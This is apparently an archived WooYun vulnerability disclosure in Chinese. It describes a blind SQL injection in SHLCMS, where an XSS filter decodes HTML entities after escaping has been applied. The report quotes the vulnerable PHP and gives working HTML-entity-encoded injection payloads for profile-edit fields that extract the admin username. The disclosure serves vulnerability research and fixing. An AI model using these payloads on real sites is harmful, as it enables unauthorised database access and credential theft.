@@ -1,0 +1,286 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		SHLCMS因逻辑问题造成过滤不严可SQL盲注  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		SHLCMS因逻辑问题造成过滤不严可SQL盲注  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/吴钩霜雪明">吴钩霜雪明</a> 
+</li><li>提交时间：		2013-08-21 17:11</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-08-21：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2013-11-19：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">SHLCMS因逻辑错误导致SQL注入</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">SHLCMS在xss过滤函数RemoveXSS()中为了过滤关键字更完全，将HTML编码转换回原来的字符，使得我们可以借HTML编码绕过mysql的关键字过滤。<br />
+<br />
+<br />
+<br />
+Shlcms在index.php中对其所有入口参数进行了cleanArrayForMysql处理，如下：<br />
+<br />
+</p><pre><code>$_REQUEST = cleanArrayForMysql($_REQUEST);<br />
+$_GET     = cleanArrayForMysql($_GET);<br />
+$_POST    = cleanArrayForMysql($_POST);<br />
+$request  = $_REQUEST;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+cleanArrayForMysql函数在inc/function.php中，如下<br />
+<br />
+</p><pre><code>function cleanArrayForMysql($data)<br />
+{<br />
+	if(!get_magic_quotes_gpc())<br />
+		return (is_array($data))?array_map(&#039;cleanArrayForMysql&#039;, $data):mysql_real_escape_string($data);<br />
+	else<br />
+		return $data;<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+但在留言板或用户资料等可以input的地方做了RemoveXSS处理<br />
+<br />
+RemoveXSS()函数如下<br />
+<br />
+</p><pre><code>function RemoveXSS($val) { <br />
+    // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed <br />
+    // this prevents some character re-spacing such as &lt;java\0script&gt; <br />
+    // note that you have to handle splits with \n, \r, and \t later since they *are* allowed in some inputs <br />
+    $val = preg_replace(&#039;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&#039;, &#039;&#039;, $val); <br />
+    <br />
+    // straight replacements, the user should never need these since they&#039;re normal characters <br />
+    // this prevents like &lt;IMG SRC=@avascript:alert(&#039;XSS&#039;)&gt; <br />
+    $search = &#039;abcdefghijklmnopqrstuvwxyz&#039;; <br />
+    $search .= &#039;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#039;; <br />
+    $search .= &#039;1234567890!@#$%^&amp;*()&#039;; <br />
+    $search .= &#039;~`&quot;;:?+/={}[]-_|\&#039;\\&#039;; <br />
+    for ($i = 0; $i &lt; strlen($search); $i++) { <br />
+        // ;? matches the ;, which is optional <br />
+        // 0{0,7} matches any padded zeros, which are optional and go up to 8 chars <br />
+<br />
+        // @ @ search for the hex values <br />
+        $val = preg_replace(&#039;/(&amp;#[xX]0{0,8}&#039;.dechex(ord($search[$i])).&#039;;?)/i&#039;, $search[$i], $val);//with a ; <br />
+        // @ @ 0{0,7} matches &#039;0&#039; zero to seven times <br />
+        $val = preg_replace(&#039;/(&amp;#0{0,8}&#039;.ord($search[$i]).&#039;;?)/&#039;, $search[$i], $val); // with a ; <br />
+    } <br />
+<br />
+    // now the only remaining whitespace attacks are \t, \n, and \r <br />
+    $ra1 = Array(&#039;javascript&#039;, &#039;vbscript&#039;, &#039;expression&#039;, &#039;applet&#039;, &#039;meta&#039;, &#039;xml&#039;, &#039;blink&#039;, &#039;link&#039;, &#039;style&#039;, &#039;script&#039;, &#039;embed&#039;, &#039;object&#039;, &#039;iframe&#039;, &#039;frame&#039;, &#039;frameset&#039;, &#039;ilayer&#039;, &#039;layer&#039;, &#039;bgsound&#039;, &#039;title&#039;, &#039;base&#039;); <br />
+    $ra2 = Array(&#039;onabort&#039;, &#039;onactivate&#039;, &#039;onafterprint&#039;, &#039;onafterupdate&#039;, &#039;onbeforeactivate&#039;, &#039;onbeforecopy&#039;, &#039;onbeforecut&#039;, &#039;onbeforedeactivate&#039;, &#039;onbeforeeditfocus&#039;, &#039;onbeforepaste&#039;, &#039;onbeforeprint&#039;, &#039;onbeforeunload&#039;, &#039;onbeforeupdate&#039;, &#039;onblur&#039;, &#039;onbounce&#039;, &#039;oncellchange&#039;, &#039;onchange&#039;, &#039;onclick&#039;, &#039;oncontextmenu&#039;, &#039;oncontrolselect&#039;, &#039;oncopy&#039;, &#039;oncut&#039;, &#039;ondataavailable&#039;, &#039;ondatasetchanged&#039;, &#039;ondatasetcomplete&#039;, &#039;ondblclick&#039;, &#039;ondeactivate&#039;, &#039;ondrag&#039;, &#039;ondragend&#039;, &#039;ondragenter&#039;, &#039;ondragleave&#039;, &#039;ondragover&#039;, &#039;ondragstart&#039;, &#039;ondrop&#039;, &#039;onerror&#039;, &#039;onerrorupdate&#039;, &#039;onfilterchange&#039;, &#039;onfinish&#039;, &#039;onfocus&#039;, &#039;onfocusin&#039;, &#039;onfocusout&#039;, &#039;onhelp&#039;, &#039;onkeydown&#039;, &#039;onkeypress&#039;, &#039;onkeyup&#039;, &#039;onlayoutcomplete&#039;, &#039;onload&#039;, &#039;onlosecapture&#039;, &#039;onmousedown&#039;, &#039;onmouseenter&#039;, &#039;onmouseleave&#039;, &#039;onmousemove&#039;, &#039;onmouseout&#039;, &#039;onmouseover&#039;, &#039;onmouseup&#039;, &#039;onmousewheel&#039;, &#039;onmove&#039;, &#039;onmoveend&#039;, &#039;onmovestart&#039;, &#039;onpaste&#039;, &#039;onpropertychange&#039;, &#039;onreadystatechange&#039;, &#039;onreset&#039;, &#039;onresize&#039;, &#039;onresizeend&#039;, &#039;onresizestart&#039;, &#039;onrowenter&#039;, &#039;onrowexit&#039;, &#039;onrowsdelete&#039;, &#039;onrowsinserted&#039;, &#039;onscroll&#039;, &#039;onselect&#039;, &#039;onselectionchange&#039;, &#039;onselectstart&#039;, &#039;onstart&#039;, &#039;onstop&#039;, &#039;onsubmit&#039;, &#039;onunload&#039;); <br />
+    $ra = array_merge($ra1, $ra2); <br />
+   <br />
+    $found = true; // keep replacing as long as the previous round replaced something <br />
+    while ($found == true) { <br />
+        $val_before = $val; <br />
+        for ($i = 0; $i &lt; sizeof($ra); $i++) { <br />
+            $pattern = &#039;/&#039;; <br />
+            for ($j = 0; $j &lt; strlen($ra[$i]); $j++) { <br />
+                if ($j &gt; 0) { <br />
+                    $pattern .= &#039;(&#039;; <br />
+                    $pattern .= &#039;(&amp;#[xX]0{0,8}([9ab]);)&#039;; <br />
+                    $pattern .= &#039;|&#039;; <br />
+                    $pattern .= &#039;|(&amp;#0{0,8}([9|10|13]);)&#039;; <br />
+                    $pattern .= &#039;)*&#039;; <br />
+                } <br />
+                $pattern .= $ra[$i][$j]; <br />
+            } <br />
+            $pattern .= &#039;/i&#039;; <br />
+            $replacement = substr($ra[$i], 0, 2).&#039;&lt;x&gt;&#039;.substr($ra[$i], 2); // add in &lt;&gt; to nerf the tag <br />
+            $val = preg_replace($pattern, $replacement, $val); // filter out the hex tags <br />
+            if ($val_before == $val) { <br />
+                // no replacements were made, so exit the loop <br />
+                $found = false; <br />
+            } <br />
+        } <br />
+    } <br />
+    return $val; <br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+在函数中为了过滤关键字完全，将HTML编码进行了转换。<br />
+<br />
+整理一下流程，我们输入的参数经过 cleanArrayForMysql()-&gt;RemoveXSS()-&gt;mysql_query();<br />
+<br />
+限制是：RemoveXSS中过滤了逗号。php的mysql_query()不支持多语句执行。<br />
+<br />
+<br />
+<br />
+于是：那些被cleanArrayForMysql了的敏感字符可以用HTML编码绕过，然后在RemoveXSS中被转回来<br />
+<br />
+比如在会员中心的编辑资料处的SQL语句，可以这样注入<br />
+<br />
+<br />
+<br />
+最后制造出来语句如下：<br />
+<br />
+　　UPDATE `shl_user` SET `nickname`=&#039;a&#039;/*&#039;,`email`=&#039;aa@aa.aa&#039;,`qq`=&#039;&#039;,`msn`=&#039;&#039;,`sex`=*/=(select case when (select username from (select * from shl.shl_user) as a where id=1) like &#039;a%&#039; then &#039;a&#039; else &#039;b&#039; end),`address`=&#039;&#039; WHERE `id` =&#039;12&#039; LIMIT 1<br />
+<br />
+<br />
+<br />
+HTML编码关键字符后如下<br />
+<br />
+　　UPDATE `shl_user` SET `nickname`=&#039;&amp;#x61;&amp;#x27;&amp;#x2f;&amp;#x2a;&#039;,`email`=&#039;aa@aa.aa&#039;,`qq`=&#039;&#039;,`msn`=&#039;&#039;,`sex`=&amp;#x2a;&amp;#x2f;=(select case when (select username from (select * from shl.shl_user) as a where id=1) like &amp;#x27;a%&amp;#x27; then &amp;#x27;a&amp;#x27; else &amp;#x27;b&amp;#x27; end),`address`=&#039;&#039; WHERE `id` =&#039;12&#039; LIMIT 1 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">在会员中心登陆，基本资料-编辑处，编辑内容如下。<br />
+<br />
+<br />
+<br />
+nikename：&amp;#x61;&amp;#x27;&amp;#x2f;&amp;#x2a;<br />
+<br />
+sex：&amp;#x2a;&amp;#x2f;=(select case when (select username from (select * from shl.shl_user) as a where id=1) like &amp;#x27;_____&amp;#x27; then &amp;#x27;a&amp;#x27; else &amp;#x27;b&amp;#x27; end)<br />
+<br />
+</p><p class="detail"><a href="../images/2113594275c9cee22ea66cfb9bcb9da899e77357.png" target="_blank"><img src="../images/2113594275c9cee22ea66cfb9bcb9da899e77357.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+结论：id=1的username长度为5<br />
+<br />
+<br />
+<br />
+nikename：&amp;#x61;&amp;#x27;&amp;#x2f;&amp;#x2a;<br />
+<br />
+sex：&amp;#x2a;&amp;#x2f;=(select case when (select username from (select * from shl.shl_user) as a where id=1) like &amp;#x27;a%&amp;#x27; then &amp;#x27;a&amp;#x27; else &amp;#x27;b&amp;#x27; end)<br />
+<br />
+</p><p class="detail"><a href="../images/2113594275c9cee22ea66cfb9bcb9da899e77357.png" target="_blank"><img src="../images/2113594275c9cee22ea66cfb9bcb9da899e77357.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+结论：id=1的username以a开头<br />
+<br />
+<br />
+<br />
+用PYTHON写个程序，在select语句中加入正则表达式，可以加快盲注速度。<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">逻辑严谨一点。<br />
+<br />
+<br />
+<br />
+还有代码中发现很多错误。比如那个RemoveXSS()中过滤逗号的那一句应该是开发人员粗心写上去的(他应该只是想把逗号作为分隔符，正则基础不过关啊)(试想留言板不能用逗号那是不实际的)。还有RemoveXSS()那个应该是9ad不是9ab才对。<br />
+<br />
+ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/吴钩霜雪明" title="吴钩霜雪明">吴钩霜雪明</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-034885" title="SHLCMS因逻辑问题造成过滤不严可SQL盲注">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="34885";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
